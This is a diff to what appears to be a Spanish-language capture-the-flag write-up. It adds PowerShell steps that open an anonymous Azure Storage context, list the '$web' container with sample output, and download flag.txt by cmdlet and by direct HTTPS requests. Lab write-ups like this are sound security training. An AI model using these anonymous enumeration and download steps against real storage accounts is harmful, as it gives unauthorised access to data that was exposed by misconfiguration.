@@ -172,11 +172,28 @@ Install-Module -Name Az.Storage -Force
 # Crear contexto de storage sin autenticación
 $ctx = New-AzStorageContext -StorageAccountName "ctf25sa9ed81dc6" -Anonymous
 
-# Listar blobs
+# Listar blobs en el container
 Get-AzStorageBlob -Container '$web' -Context $ctx
 
-# Descargar flag
+# Salida esperada:
+# Name         BlobType  Length  ContentType   LastModified         AccessTier
+# ----         --------  ------  -----------   ------------         ----------
+# flag.txt     BlockBlob 42      text/plain    2025-09-12 20:01:37Z Hot
+# index.html   BlockBlob 13168   text/html     2025-09-12 20:01:37Z Hot
+
+# Descargar flag a archivo local
 Get-AzStorageBlobContent -Container '$web' -Blob "flag.txt" -Destination "./flag.txt" -Context $ctx
+
+# Ver contenido de la flag
+Get-Content "./flag.txt"
+
+# Método alternativo: Descargar directamente con Invoke-WebRequest
+$flagContent = Invoke-WebRequest -Uri "https://ctf25sa9ed81dc6.z13.web.core.windows.net/flag.txt"
+Write-Output "Flag: $($flagContent.Content)"
+
+# O usar el endpoint blob directo
+$flagContent = Invoke-WebRequest -Uri "https://ctf25sa9ed81dc6.blob.core.windows.net/`$web/flag.txt"
+Write-Output "Flag: $($flagContent.Content)"
 ```
 
 **Usando Python con azure-storage-blob:**
